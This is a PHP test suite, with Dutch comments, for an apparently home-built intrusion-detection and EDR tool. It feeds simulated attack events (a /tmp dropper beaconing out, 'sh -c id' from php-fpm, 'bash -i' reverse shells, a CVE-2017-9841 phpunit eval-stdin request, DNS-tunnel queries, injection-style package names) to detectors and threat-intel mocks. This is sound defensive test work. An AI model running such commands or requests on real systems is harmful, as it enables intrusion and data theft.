Edr::process($hd, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/.cache/kd', 'size' => 1000, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('a', 64)],
    ['k' => 'n', 't' => time() + 1, 'dir' => 'out', 'pid' => 400, 'st' => 5, 'comm' => 'kd', 'exe' => '/tmp/.cache/kd', 'u' => 'root', 'rip' => '198.51.100.99', 'rp' => 3333, 'lp' => 40000]]]);
Chain::check($hd);
$dr = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'chain' AND dkey = 'dropper'", [$hd['id']])->fetch();
ok($dr && (int) $dr['severity'] === 2 && q('SELECT isolate_until > NOW() FROM hosts WHERE id = ?', [$hd['id']])->fetchColumn(), 'keten: binnengehaald en contact naar buiten → server geïsoleerd');
// Verder het netwerk in: login op ci-c vanaf ci-d (waar net een keten was)
Chain::reset();
Chain::lateral($hc, '10.0.0.4', 'bob');
Chain::check($hc);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'chain' AND dkey = ?", [$hc['id'], 'lateral|' . $hd['id']])->fetchColumn() === 1, 'keten: login vanaf een gehackte eigen server → verder het netwerk in');
// MITRE-overzicht
$ov = Chain::overview(30);
$exe = array_values(array_filter($ov['tactics'], static fn($t) => $t['slug'] === 'initial-access'))[0] ?? [];
$t1190 = array_values(array_filter($exe['techs'] ?? [], static fn($t) => $t['id'] === 'T1190'))[0] ?? [];
ok(($t1190['n'] ?? 0) >= 2 && count($ov['tactics']) >= 14, 'MITRE-overzicht: T1190 gezien (' . ($t1190['n'] ?? 0) . '×)');
ok(count(Chain::signals(30, null, null, 'T1190')) >= 2, 'MITRE: signalen bij een techniek');
// Ongewoon tijdstip: actief op een uur waarop dat nooit gebeurde
for ($d = 1; $d <= 8; $d++) {
    q("INSERT INTO edr_hourly (host_id, hr, kind, n) VALUES (?, ?, 'i', 5) ON DUPLICATE KEY UPDATE n = 5", [$hd['id'], date('Y-m-d', strtotime("-$d day")) . ' ' . sprintf('%02d', (int) date('G') === 10 ? 11 : 10) . ':00:00']);
}
Edr::process($hd, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 500, 'st' => 6, 'uid' => 1000, 'auid' => '1000', 'u' => 'bob', 'exe' => '/usr/bin/ls', 'comm' => 'ls', 'argv' => ['ls'], 'cmd' => 'ls', 'pc' => 'bash']]]);
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND feature = 'hour'", [$hd['id']])->fetchColumn() === 1, 'ongewoon tijdstip: actief op een uur zonder geschiedenis');

section('Dreigingsinformatie (1.112.0)');
// Nep-internet: AbuseIPDB, GreyNoise, Shodan, CIRCL, MalwareBazaar, ThreatFox, Tor, URLhaus
$tiLog = [];
ThreatIntel::$http = static function (string $m, string $url, array $h, ?string $body) use (&$tiLog) {
    $tiLog[] = "$m $url";
    $bad = str_contains($url, '203.0.113.60') || str_contains($url, '203.0.113.61');
    return match (true) {
        str_contains($url, 'abuseipdb.com/api/v2/check') => [200, json_encode(['data' => $bad ? ['abuseConfidenceScore' => 100, 'totalReports' => 523, 'numDistinctUsers' => 210, 'usageType' => 'Data Center/Web Hosting/Transit', 'isp' => 'Evil BV', 'isTor' => false]
            : ['abuseConfidenceScore' => 0, 'totalReports' => 0, 'numDistinctUsers' => 0, 'isWhitelisted' => false]])],
        str_contains($url, 'abuseipdb.com/api/v2/report') => [200, '{"data":{"abuseConfidenceScore":100}}'],
        str_contains($url, 'greynoise') => str_contains($url, '203.0.113.70') ? [200, '{"noise":true,"riot":false,"classification":"benign","name":"Shodan.io"}']
            : ($bad ? [200, '{"noise":true,"riot":false,"classification":"malicious","name":"unknown"}'] : [404, '{"message":"IP not observed"}']),
        str_contains($url, 'internetdb.shodan.io') => [404, '{"detail":"No information available"}'],
        str_contains($url, 'hashlookup.circl.lu') => str_contains($url, str_repeat('b', 64)) ? [200, '{"FileName":"./usr/bin/ls","source":"NSRL"}'] : [404, '{}'],
        str_contains($url, 'mb-api.abuse.ch') => str_contains((string) $body, str_repeat('e', 64)) ? [200, '{"query_status":"ok","data":[{"signature":"XMRig","file_type":"elf","tags":["miner"]}]}'] : [200, '{"query_status":"hash_not_found"}'],
        str_contains($url, 'threatfox') => [200, json_encode(['query_status' => 'ok', 'data' => [['ioc' => '198.51.100.66:443', 'ioc_type' => 'ip:port', 'malware_printable' => 'Cobalt Strike', 'threat_type' => 'botnet_cc'],
            ['ioc' => 'c2.badguys.example', 'ioc_type' => 'domain', 'malware_printable' => 'AsyncRAT', 'threat_type' => 'botnet_cc']]])],
        str_contains($url, 'torbulkexitlist') => [200, "198.51.100.200\n198.51.100.201\n"],
        str_contains($url, 'urlhaus') => [200, "# URLhaus\n127.0.0.1\tmalware.evil.example\n127.0.0.1\tdrop.bad.example\n"],
        default => [0, ''],
    };
};
save_setting('ti_abuseipdb_key', 'test-key');
save_setting('ti_abusech_key', 'test-abusech');
save_setting('ids_mode', 'block');
$v = ThreatIntel::lookupIp('203.0.113.61');
ok($v['verdict'] === 'malicious' && $v['score'] === 100 && str_contains(implode(' ', $v['why']), 'AbuseIPDB 100%'), 'AbuseIPDB 100% + GreyNoise kwaadaardig → bekende aanvaller');
ok(ThreatIntel::lookupIp('203.0.113.70')['verdict'] === 'benign', 'GreyNoise: onschuldige scanner (Shodan) → onschuldig');
ok(ThreatIntel::lookupIp('203.0.113.80')['verdict'] === 'clean', 'niets bekend → niet bekend als aanvaller');
// Wachtrij: login van buiten vanaf een bekende aanvaller → critical, geblokkeerd, oordeel bij het incident
q('DELETE FROM ti_ip');
$li = Ids::raise($hc, 1, 'ssh_login', 'root|203.0.113.60', 'SSH-login van buiten: root vanaf 203.0.113.60', 'Geslaagde login', '203.0.113.60');
$wp = Ids::raise($hc, 1, 'web_payload', 'swag|203.0.113.70', 'Webaanval vanaf 203.0.113.70: scanner', 'scanner', '203.0.113.70');
ok((int) q('SELECT COUNT(*) FROM ti_queue')->fetchColumn() >= 2, 'nieuwe incidenten met een IP van buiten in de wachtrij');
Chain::reset();
ThreatIntel::cron();
$li2 = q('SELECT * FROM ids_incidents WHERE id = ?', [$li])->fetch();
ok((int) $li2['severity'] === 2 && str_contains((string) $li2['detail'], '🌐') && str_contains((string) $li2['detail'], 'bekende aanvaller'), 'login vanaf een bekende aanvaller → critical, met het oordeel');
ok((int) q("SELECT COUNT(*) FROM ids_blocks WHERE host_id = ? AND ip = '203.0.113.60' AND removed_at IS NULL", [$hc['id']])->fetchColumn() === 1, 'bekende aanvaller automatisch geblokkeerd');
ok(q('SELECT status FROM ids_incidents WHERE id = ?', [$wp])->fetchColumn() === 'done', 'webaanval van een onschuldige scanner vanzelf afgehandeld');
ok(ThreatIntel::listed('i', '198.51.100.200')['src'] === 'tor' && (ThreatIntel::domain('x.malware.evil.example')['src'] ?? '') === 'urlhaus'
    && (ThreatIntel::domain('c2.badguys.example')['info'] ?? '') === 'AsyncRAT botnet_cc', 'lijsten opgehaald: Tor, URLhaus en ThreatFox');
// 1.213.1: check.torproject.org weigert (of geeft een foutpagina): dan de reservebron (FireHOL tor_exits)
ok(IpIntel::torIps("<!DOCTYPE html><html>403</html>") === [] && IpIntel::torIps("# tor_exits\n# comment\n198.51.100.210\n198.51.100.211\n") === ['198.51.100.210', '198.51.100.211'],
    'Tor-lijst: foutpagina geweigerd, ipset van FireHOL (met commentaar) gelezen');
$tiOld = ThreatIntel::$http;
ThreatIntel::$http = static function (string $m, string $url, array $h, ?string $body) use ($tiOld) {
    return match (true) {
        str_contains($url, 'torbulkexitlist') => [403, '<html>Forbidden</html>'],
        str_contains($url, 'tor_exits.ipset') => [200, "# FireHOL tor_exits\n198.51.100.220\n"],
        default => $tiOld($m, $url, $h, $body),
    };
};
ThreatIntel::updateLists();
ok(ThreatIntel::listed('i', '198.51.100.220')['src'] === 'tor', 'Tor-lijst niet op te halen bij torproject.org: van de reservebron');
ThreatIntel::$http = $tiOld;
ok(ThreatIntel::domain('example') === null && ThreatIntel::domain('evil.example') === null, 'alleen het domein zelf of een subdomein telt');
// Verbinding met een adres van ThreatFox: meteen critical en proces stoppen
$r = Edr::process($hc, ['ev' => [['k' => 'n', 't' => time(), 'dir' => 'out', 'pid' => 777, 'st' => 70, 'comm' => 'updater', 'exe' => '/opt/x/updater', 'u' => 'root', 'rip' => '198.51.100.66', 'rp' => 443, 'lp' => 50000]]]);
$c2 = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'ti_ip' AND ip = '198.51.100.66'", [$hc['id']])->fetch();
ok($c2 && (int) $c2['severity'] === 2 && str_contains((string) $c2['detail'], 'Cobalt Strike') && ($r['edr_kill'] ?? null) === [[777, 70]], 'verbinding met een botnet-server (ThreatFox) → critical, proces gestopt');
// Bestanden: bekende malware (MalwareBazaar) en een bekend goed bestand (CIRCL)
Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/opt/tools/xm', 'size' => 9000, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('e', 64)],
    ['k' => 'f', 't' => time(), 'path' => '/opt/tools/ls', 'size' => 9000, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('b', 64)]]]);
ThreatIntel::cron();
$mw = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'ti_malware'", [$hc['id']])->fetch();
ok($mw && (int) $mw['severity'] === 2 && str_contains((string) $mw['title'], 'XMRig') && str_contains((string) $mw['title'], '/opt/tools/xm'), 'bekende malware (MalwareBazaar) → critical: ' . ($mw['title'] ?? '-'));
ok((ThreatIntel::hash(str_repeat('b', 64))['verdict'] ?? '') === 'known_good', 'bekend goed bestand (CIRCL)');
// Aanval op een lek dat de server echt heeft
q("INSERT INTO vuln_findings (host_id, package, version, source, vuln_id, cve, fixed_version, first_seen) VALUES (?, 'phpunit', '5.6.2', 'composer', 'GHSA-x', 'CVE-2017-9841', '5.6.3', NOW())", [$hc['id']]);
Inspect::requests($hc, [['203.0.113.90', time(), 'POST', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 200, 10, 'curl/8', '-']]);
$wc = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'web_cve'", [$hc['id']])->fetch();
ok($wc && (int) $wc['severity'] === 2 && str_contains((string) $wc['detail'], 'phpunit 5.6.2'), 'aanval op een lek dat deze server heeft (CVE-2017-9841) → critical');
// Melden bij AbuseIPDB (alleen als het aan staat), één keer per dag
$tiLog = [];
ThreatIntel::cron();
ok(!array_filter($tiLog, static fn($l) => str_contains($l, '/report')), 'melden staat standaard uit');
save_setting('ti_report', '1');
ThreatIntel::cron();
ThreatIntel::cron();
ok(count(array_filter($tiLog, static fn($l) => str_contains($l, '/report'))) === count(array_unique(q("SELECT ip FROM ids_blocks WHERE auto = 1 AND created_at >= NOW() - INTERVAL 1 HOUR AND ip NOT LIKE '10.%' AND ip NOT LIKE '192.168.%'")->fetchAll(PDO::FETCH_COLUMN)))
    && q("SELECT reported_at FROM ti_ip WHERE ip = '203.0.113.60'")->fetchColumn(), 'geblokkeerde aanvallers gemeld bij AbuseIPDB, één keer per IP');
save_setting('ti_report', '0');
ThreatIntel::$http = null;

section('Netwerk: YARA, Suricata en DNS via AdGuard (1.113.0)');
Chain::reset();
Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/.x/conf.json', 'size' => 300, 'elf' => 0, 'x' => 1, 'sha' => str_repeat('1', 64), 'yara' => 'rz_cryptominer']]]);
$y = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'edr' AND dkey LIKE 'rz-yara|%'", [$hc['id']])->fetch();
ok($y && (int) $y['severity'] === 2, 'YARA-treffer (cryptominer) → critical');
Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/tool', 'size' => 300, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('2', 64), 'yara' => 'rz_info_upx_packed']]]);
ok((int) q("SELECT severity FROM ids_incidents WHERE host_id = ? AND dkey LIKE 'rz-yara-info|%'", [$hc['id']])->fetchColumn() === 1, 'alleen een aanwijzing (UPX) → warning');
// 1.127.1: de werkmap van dracut (nieuwe initramfs na een kernel-update) is geen 'nieuw programma in /tmp'
$drop = static fn(string $path) => (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND dkey LIKE 'rz-drop-elf|%' AND detail LIKE ?", [$hc['id'], '%' . $path . '%'])->fetchColumn();
foreach (['/var/tmp/dracut.CbpkW9/initramfs/usr/bin/ps', '/var/tmp/dracutx/ps', '/var/tmp/x/dracut.CbpkW9/ps'] as $k => $p) {
    Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => $p, 'size' => 144536, 'elf' => 1, 'x' => 1, 'sha' => str_repeat((string) (3 + $k), 64)]]]);
}
ok($drop('/var/tmp/dracut.CbpkW9/') === 0, 'programma in de werkmap van dracut (kernel-update) → geen melding');
ok($drop('/var/tmp/dracutx/') === 1 && $drop('/var/tmp/x/dracut.CbpkW9/') === 1, 'alleen de echte vorm dracut.XXXXXX direct in /tmp of /var/tmp wordt overgeslagen');
$r = Edr::process($hc, ['ev' => [], 'info' => ['yara' => 'ok', 'ysha' => '']]);
ok(base64_decode($r['edr_yara'] ?? '') === Edr::yaraRules() && str_contains(Edr::yaraRules(), 'rule rz_php_webshell_eval'), 'YARA-regels naar de agent als hij ze nog niet heeft');
ok(!isset(Edr::process($hc, ['ev' => [], 'info' => ['yara' => 'ok', 'ysha' => hash('sha256', Edr::yaraRules())]])['edr_yara']), 'niet opnieuw als de agent de nieuwste regels heeft');
// Suricata
Suricata::process($hc, [['2026-10-28T10:00:01+0100', '203.0.113.120', 51234, '10.0.0.3', 22, 'TCP', 2001219, 'ET EXPLOIT Something', 'Attempted Administrator Privilege Gain', 1, 'allowed'],
    ['2026-10-28T10:00:02+0100', '10.0.0.3', 40000, '198.51.100.140', 443, 'TCP', 2030000, 'ET MALWARE Cobalt Strike Beacon', 'A Network Trojan was detected', 2, 'allowed'],
    ['2026-10-28T10:00:03+0100', '203.0.113.121', 1, '10.0.0.3', 80, 'TCP', 2100498, 'GPL ATTACK_RESPONSE id check returned root', 'Potentially Bad Traffic', 3, 'allowed']]);
$s1 = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'suricata' AND ip = '203.0.113.120'", [$hc['id']])->fetch();
ok($s1 && (int) $s1['severity'] === 2 && str_contains((string) $s1['detail'], '⛔'), 'Suricata ernst 1 van buiten → critical en geblokkeerd');
$s2 = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'suricata' AND ip = '198.51.100.140'", [$hc['id']])->fetch();
ok($s2 && (int) $s2['severity'] === 1 && (int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND feature = 'suricata' AND FIND_IN_SET('command-and-control', tactics)", [$hc['id']])->fetchColumn() >= 1,
    'Suricata C2 van een eigen server naar buiten → warning, signaal Op afstand besturen');
ok(!q("SELECT 1 FROM ids_incidents WHERE type = 'suricata' AND ip = '203.0.113.121'")->fetchColumn(), 'Suricata ernst 3: alleen een signaal');
// DNS via AdGuard
$e = static fn(string $client, string $name, string $reason = 'NotFilteredNotFound', string $status = 'NOERROR', array $answer = []) =>
    ['client' => $client, 'client_info' => ['name' => 'tv-woonkamer'], 'question' => ['name' => $name, 'type' => 'A'], 'reason' => $reason, 'status' => $status, 'answer' => $answer, 'time' => date('c')];
$before = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE type IN ('dns_bad', 'dns_odd')")->fetchColumn();
$list = [$e('192.168.1.77', 'cdn.malware.evil.example'), $e('10.0.0.3', 'c2.badguys.example', 'FilteredBlackList'), $e('192.168.1.78', 'login-bank.example', 'FilteredSafeBrowsing'),
    $e('192.168.1.79', 'ok.example', 'NotFilteredNotFound', 'NOERROR', [['type' => 'A', 'value' => '198.51.100.66']]), $e('192.168.1.80', 'www.nu.nl')];
for ($i = 0; $i < 45; $i++) {
    $list[] = $e('192.168.1.81', bin2hex(random_bytes(16)) . '.exfil.example');
}
for ($i = 0; $i < 35; $i++) {
    $list[] = $e('192.168.1.82', 'xq' . substr(str_shuffle('bcdfghjklmnpqrstvwxz0123456789'), 0, 12) . '.com', 'NotFilteredNotFound', 'NXDOMAIN');
}
DnsWatch::check($list);
$dns = q("SELECT title, severity, dkey FROM ids_incidents WHERE type IN ('dns_bad', 'dns_odd') ORDER BY id")->fetchAll();
$keys = array_column($dns, 'dkey');
ok(in_array('192.168.1.77|cdn.malware.evil.example', $keys, true) && (int) $dns[array_search('192.168.1.77|cdn.malware.evil.example', $keys)]['severity'] === 2, 'malwaredomein (URLhaus, subdomein) → critical');
ok((int) $dns[array_search('10.0.0.3|c2.badguys.example', $keys)]['severity'] === 1 && (int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND feature = 'dns_bad'", [$hc['id']])->fetchColumn() === 1,
    'botnetdomein dat AdGuard tegenhield → warning; een eigen server krijgt een signaal');
ok(in_array('192.168.1.78|login-bank.example', $keys, true) && in_array('192.168.1.79|ok.example', $keys, true) && !in_array('192.168.1.80|www.nu.nl', $keys, true),
    'AdGuard Safe Browsing en een antwoord naar een botnet-server gemeld; gewoon domein niet');
ok(in_array('192.168.1.81|tunnel|exfil.example', $keys, true) && in_array('192.168.1.82|dga', $keys, true), 'DNS-tunnel en verzonnen domeinen herkend');
ok(count($dns) - $before === 6, 'precies 6 meldingen');
// De cron: de eerste keer alleen vastleggen, daarna alleen de nieuwe regels
save_setting('adguard_urls', 'http://adguard.test');
$ag = [['data' => [['time' => date('c', time() - 60)] + $e('192.168.1.90', 'old.malware.evil.example')]], ['data' => [['time' => date('c', time() + 5)] + $e('192.168.1.91', 'new.malware.evil.example'),
    ['time' => date('c', time() - 60)] + $e('192.168.1.90', 'old.malware.evil.example')]]];
$call = 0;
DnsWatch::$fetch = static function () use (&$call, $ag) { return [$ag[min($call++, 1)], null]; };
DnsWatch::cron();
DnsWatch::cron();
ok(!q("SELECT 1 FROM ids_incidents WHERE dkey = '192.168.1.90|old.malware.evil.example'")->fetchColumn() && q("SELECT 1 FROM ids_incidents WHERE dkey = '192.168.1.91|new.malware.evil.example'")->fetchColumn(),
    'AdGuard-log: alleen nieuwe regels (de eerste keer alleen vastleggen)');
DnsWatch::$fetch = null;
save_setting('adguard_urls', '');

section('RzSense zelf: toegestaan, nooit ingrijpen (1.114.0)');
ok(in_array("0\tedrself\t" . SM_ROOT, array_map(static fn($l) => implode("\t", array_slice(explode("\t", $l), 0, 3)), Edr::agentLines($hc)), true), 'agent krijgt de map van RzSense (om RzSense zelf te herkennen)');
Chain::reset();
$sig0 = (int) q('SELECT COUNT(*) FROM ids_signals')->fetchColumn();
$inc0 = (int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn();
$r = Edr::process($hc, ['ev' => [
    ['k' => 'x', 't' => time(), 'pid' => 8001, 'st' => 5, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/dash', 'comm' => 'sh', 'pc' => 'php-fpm8.2', 'cwd' => SM_ROOT . '/public', 'cmd' => 'sh -c timeout 2 getent hosts 203.0.113.5', 'own' => 'rzmon'],
    ['k' => 'x', 't' => time(), 'pid' => 8002, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/ss', 'comm' => 'ss', 'pc' => 'rzmon-agent.sh', 'cmd' => 'ss -tnpH', 'own' => 'agent'],
    ['k' => 'x', 't' => time(), 'pid' => 8003, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/awk', 'comm' => 'awk', 'pc' => 'rzmon-agent.sh', 'cmd' => 'awk {print}', 'own' => 'agent'],
    ['k' => 'n', 't' => time(), 'dir' => 'out', 'pid' => 8004, 'st' => 6, 'comm' => 'bash', 'exe' => '/usr/bin/bash', 'u' => 'root', 'rip' => '203.0.113.200', 'rp' => 4444, 'lp' => 50000, 'own' => 'agent']]]);
ok($r === [] && (int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn() === $inc0 && (int) q('SELECT COUNT(*) FROM ids_signals')->fetchColumn() === $sig0,
    'RzSense zelf (ook iets wat op een webshell lijkt): geen incident, niets gestopt, niet voor ketens');
$would = q("SELECT data FROM edr_events WHERE host_id = ? AND own = 'rzmon' AND kind = 'x'", [$hc['id']])->fetchColumn();
ok($would && str_contains((string) json_decode((string) $would, true)['_would'], 'Webserver start een shell'), 'groene regel: zou rz-webshell raken, maar is RzSense zelf');
$sum = json_decode((string) q("SELECT data FROM edr_events WHERE host_id = ? AND kind = 'o' AND own = 'agent' ORDER BY id DESC LIMIT 1", [$hc['id']])->fetchColumn(), true);
ok(($sum['n']['exec'] ?? 0) === 2 && count($sum['s'] ?? []) === 2, 'agent: één samengevatte groene regel per rapport (2 processen)');
ok(q("SELECT 1 FROM edr_events WHERE host_id = ? AND own = 'agent' AND kind = 'n'", [$hc['id']])->fetchColumn() !== false, 'verbinding van de agent die op een reverse shell lijkt: groen, met de regel erbij');
$f = Edr::feed(50, (int) $hc['id']);
$f2 = Edr::feed(50, (int) $hc['id'], false, 0, false);
ok(array_filter($f, static fn($e) => $e['own'] === 'agent' && $e['kind'] === 'own') && !array_filter($f2, static fn($e) => $e['own'] !== null), 'Live: groene regels, en te verbergen');
// Verkeer van of naar RzSense (Suricata, DNS): toegestaan
save_setting('rz_own_ips', json_encode(['10.0.0.9']));
$inc0 = (int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn();
Suricata::process($hc, [['2026-10-28T10:00:01+0100', '10.0.0.9', 40000, '10.0.0.3', 22, 'TCP', 2010937, 'ET SCAN Suspicious inbound to SSH (nmap)', 'Attempted Information Leak', 1, 'allowed']]);
DnsWatch::check([['client' => '10.0.0.9', 'client_info' => ['name' => 'rzmon'], 'question' => ['name' => 'x.malware.evil.example'], 'reason' => 'NotFilteredNotFound', 'status' => 'NOERROR', 'time' => date('c')]]);
ok((int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn() === $inc0 && (int) q("SELECT COUNT(*) FROM edr_events WHERE own = 'net' AND kind IN ('s', 'd')")->fetchColumn() === 2,
    'netwerkscan van RzSense (Suricata) en DNS van RzSense: geen incident, wel een groene regel');
ok(Ids::protectedIp('10.0.0.9') && Ids::autoBlock($hc, '10.0.0.9', 'test') === null, 'RzSense wordt nooit geblokkeerd');

section('Bescherming: waarom, trigger en actie (1.115.0)');
save_setting('ids_mode', 'block');
Protect::reset();
$b = Ids::autoBlock($hd, '203.0.113.150', 'Brute force: 12 mislukte SSH-logins in 10 min');
$bf = Ids::raise($hd, 1, 'bruteforce', '203.0.113.150', 'Brute force op SSH vanaf 203.0.113.150 (12 pogingen in 10 min)', 'Gebruikers: root, admin · ⛔ ' . $b, '203.0.113.150');
$x = Protect::describe(q('SELECT * FROM ids_incidents WHERE id = ?', [$bf])->fetch());
ok(($x['card']['id'] ?? '') === 'bruteforce' && str_contains($x['why'], 'Meer dan 10 mislukte SSH-logins binnen 10 minuten'), 'waarom: de regel met de drempel');
ok($x['trigger'] === 'Gebruikers: root, admin', 'trigger: de feiten, zonder de actie (' . $x['trigger'] . ')');
ok(($x['actions'][0]['t'] ?? '') === 'block' && $x['actions'][0]['ok'] === true && str_contains($x['actions'][0]['text'], 'IP geblokkeerd tot'), 'actie: IP geblokkeerd, met de tijd');
Ids::unblock((int) q("SELECT id FROM ids_blocks WHERE ip = '203.0.113.150' AND removed_at IS NULL")->fetchColumn(), 'Rehman');
$x = Protect::describe(q('SELECT * FROM ids_incidents WHERE id = ?', [$bf])->fetch());
ok(str_contains($x['actions'][0]['text'], 'gedeblokkeerd door Rehman'), 'stand bijgewerkt: gedeblokkeerd door wie');
$r = Edr::process($hd, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 9100, 'st' => 44, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/dash', 'comm' => 'sh', 'argv' => ['sh', '-c', 'id'], 'cmd' => 'sh -c id', 'pc' => 'php-fpm8.2']]]);
$ws = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'edr' AND dkey LIKE 'rz-webshell|%' ORDER BY id DESC LIMIT 1", [$hd['id']])->fetch();
$x = Protect::describe($ws);
ok(($x['card']['id'] ?? '') === 'webshell' && str_contains($x['actions'][0]['text'], 'proces 9100 wordt gestopt') && str_contains($x['why'], 'webserver'), 'webshell: waarom uit de regel, proces wordt gestopt');
q("UPDATE ids_kills SET done_at = NOW(), result = ? WHERE pid = 9100", [t('gestopt')]);
ok(Protect::describe($ws)['actions'][0]['ok'] === true, 'stand bijgewerkt: gestopt, bevestigd door de agent');
save_setting('ids_mode', 'learn');
$wl = Ids::raise($hd, 1, 'web_payload', 'swag|203.0.113.151', 'Webaanval vanaf 203.0.113.151: SQL-injectie', '1 verdachte verzoek(en)', '203.0.113.151');
$x = Protect::describe(q('SELECT * FROM ids_incidents WHERE id = ?', [$wl])->fetch());
ok(($x['actions'][0]['t'] ?? '') === 'learn' && str_contains($x['actions'][0]['text'], 'IP blokkeren'), 'modus Leren: wat RzSense in Blokkeren zou doen');
$p = Protect::pushText($bf);
ok(str_contains($p, 'Waarom: Meer dan 10') && str_contains($p, 'Trigger: Gebruikers') && str_contains($p, 'Actie: ↩'), 'Pushover: waarom, trigger en actie');
$all = Protect::describeAll(q('SELECT * FROM ids_incidents WHERE id IN (?, ?)', [$bf, $wl])->fetchAll());
ok(($all[$bf]['card'] ?? '') === 'bruteforce' && ($all[$wl]['acts'][0][2] ?? '') === 'learn', 'lijst: kaart en acties per incident');
$ov = Protect::overview();
$bfc = array_values(array_filter($ov['cards'], static fn($c) => $c['id'] === 'bruteforce'))[0] ?? [];
ok($ov['total'] >= 25 && ($bfc['n'] ?? 0) >= 1 && count(array_filter($ov['cards'], static fn($c) => $c['toggle'] !== null)) >= 18, 'Bescherming: kaarten met schakelaar en cijfers (' . $ov['total'] . ')');
// Een oud incident (zonder modus, met de actie alleen in de tekst) krijgt toch een uitleg
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip) VALUES (?, 2, 'revshell', 'x', 'Reverse shell', 'bash -i · ⛔ server geïsoleerd (24 uur)', NULL)", [$hd['id']]);
$x = Protect::describe(q('SELECT * FROM ids_incidents ORDER BY id DESC LIMIT 1')->fetch());
ok(($x['card']['id'] ?? '') === 'revshell' && in_array('isolate', array_column($x['actions'], 't'), true), 'oud incident: kaart en isolatie uit de tekst');
save_setting('ids_mode', 'learn');

section('Moderne IDS-pagina (1.117.0)');
ok(setting('ids_modern') === '1', 'moderne weergave staat standaard aan');
save_setting('ids_modern', '0');
Installer::runSchema();
ok(setting('ids_modern') === '0', 'een update zet de keuze voor de compacte weergave niet terug');
save_setting('ids_modern', '1');

section('Snelheid (1.119.0)');
ok(class_exists('SnmpDown') && class_exists('VulnFetchError') && function_exists('t'), 'klassen worden pas geladen als ze nodig zijn, ook de hulpklassen');
Perf::lap('start');
Perf::lap('testonderdeel');
$pr = Perf::report();
ok(in_array('testonderdeel', array_column($pr['cron'], 'name'), true) && isset($pr['opcache']['on']) && count($pr['tables']) > 5, 'snelheidsmeter: cron-onderdeel, OPcache en tabellen');
save_setting('perf_on', '0');
Perf::lap('uit');
ok(!in_array('uit', array_column(Perf::report()['cron'], 'name'), true), 'snelheidsmeter uit: niets meer vastgelegd');
save_setting('perf_on', '1');
// 1.125.0: eigen pakketnamen bij installeren
ok(Edr::parsePkgs('audit, audispd-plugins  audit') === ['audit', 'audispd-plugins'] && is_string(Edr::parsePkgs('-y;rm')) && is_string(Edr::parsePkgs('../x'))
    && is_string(Edr::parsePkgs(implode(' ', range(1, 11)))) && is_string(Edr::parsePkgs('  ')), 'eigen pakketnamen: alleen gewone namen, hooguit 10');
$pct = static fn($ok, $n) => (int) $n > 0 ? round((int) $ok / (int) $n * 100, 3) : null;
save_setting('stats_daily_at', '0');
Analytics::cron();
$full = (new ReflectionMethod('Stats', 'uptimeFull'))->invoke(null, $pct);
$fast = Stats::uptime();
ok(array_map(static fn($x) => $x['h24'], $full) == array_map(static fn($x) => $x['h24'], $fast), 'beschikbaarheid uit de dagtotalen: 24 uur gelijk aan de volledige berekening');


section('Uitzonderingen en eigen processen (1.132.0)');
save_setting('ids_enabled', '1');
save_setting('ids_mode', 'learn');
Edr::reset();
Exceptions::reset();
// Matchen: programma (naam of pad), pad met **, IP-netwerk; zonder voorwaarden nooit raak
ok(Exceptions::matches(['program' => ['Plex Media Serv*']], ['program' => 'Plex Media Serv']) && Exceptions::matches(['program' => ['/usr/bin/sed'], 'parent' => ['run-parts']], ['program' => '/usr/bin/sed', 'parent' => 'run-parts'])
    && !Exceptions::matches(['program' => ['sed'], 'parent' => ['run-parts']], ['program' => '/usr/bin/sed', 'parent' => 'bash'])
    && Exceptions::matches(['path' => ['/var/tmp/dracut.*/**']], ['path' => '/var/tmp/dracut.Ab12Cd/initramfs/usr/bin/ps'])
    && !Exceptions::matches(['path' => ['/var/tmp/dracut.*/**']], ['path' => '/var/tmp/x/dracut.Ab12Cd/ps'])
    && Exceptions::matches(['ip' => ['86.85.247.0/24']], ['ip' => '86.85.247.15']) && !Exceptions::matches([], ['program' => 'x']), 'voorwaarden: programma, ouder, pad met **, netwerk; zonder voorwaarden nooit raak');
$bad = static function (array $in): bool { try { Exceptions::clean($in); return false; } catch (InvalidArgumentException) { return true; } };
ok($bad(['name' => 'alles']) && $bad(['name' => 'yara', 'rule' => 'rz-yara', 'cond' => ['program' => 'x']]) && $bad(['name' => 'ip', 'cond' => ['ip' => 'geen-ip']])
    && !$bad(['name' => 'ok', 'cond' => ['program' => "sed\nawk"]]), 'een uitzondering voor alles, voor malware (YARA) of met een fout IP kan niet');
// EDR: webserver start een shell → incident; met een uitzondering niet meer, wel een groene regel en een teller
